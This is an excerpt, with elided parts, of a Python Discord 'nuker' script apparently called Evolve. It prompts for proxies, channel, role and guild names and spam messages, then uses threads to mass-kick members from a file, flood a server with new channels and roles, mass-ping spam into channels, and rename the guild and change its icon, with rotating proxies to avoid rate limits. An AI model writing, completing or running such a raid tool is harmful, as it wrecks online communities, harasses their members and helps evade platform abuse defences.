...
__proxies__, __client__, __threads__ = None, commands.Bot(command_prefix="+", help_command=None, intents=__intents__), 45
...
class Evolve:
    def __init__(self):
        ...
        use_proxy = input("{}({}Evolve{}) Use proxies? [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")).lower()
        self.proxy = None
        if use_proxy == "y":
            proxy_file = input("{}({}Evolve{}) Enter proxy file path (e.g., proxies.txt){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            if os.path.exists(proxy_file):
                global __proxies__
                __proxies__ = cycle(open(proxy_file, "r").read().splitlines())
                self.proxy = "http://" + next(__proxies__)
        self.session = httpx.Client(transport=httpx.HTTPTransport(proxy=self.proxy) if self.proxy else None)
        ...
        self.unbanned = []
        self.assigned_roles = []
        # Prompt for nuke configuration
        self.nuke_config = {
            "channels_name": input("{}({}Evolve{}) Enter channel names (comma-separated, e.g., nuked-channel,spam){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")).split(","),
            "roles_name": input("{}({}Evolve{}) Enter role names (comma-separated, e.g., role1,role2){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")).split(","),
            "guild_names": input("{}({}Evolve{}) Enter guild names (comma-separated, e.g., Nuked-Server,Server2){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")).split(","),
            "messages_content": input("{}({}Evolve{}) Enter message contents (comma-separated, e.g., Spam1,Spam2){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")).split(","),
            "guild_icon": input("{}({}Evolve{}) Enter guild icon file path (leave blank for none){}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
        }
    ...
    def menu(self):
        ...
        if ans in ["1", "01"]:
            ...
            self.kicked.clear()
            members = open("members.txt", "r").read().splitlines()  # Updated path
            for member in members:
            ...
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(self.nuke_config["channels_name"]), type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            ...
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(self.nuke_config["roles_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            ...
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz), random.choice(self.nuke_config["messages_content"]), token))
                t.start()
            ...
            try:
                response = self.session.get("")  # Update with actual version check URL if needed
            ...
            if not new_name.strip():
                new_name = random.choice(self.nuke_config["guild_names"])
            ...
            icon_path = self.nuke_config["guild_icon"]
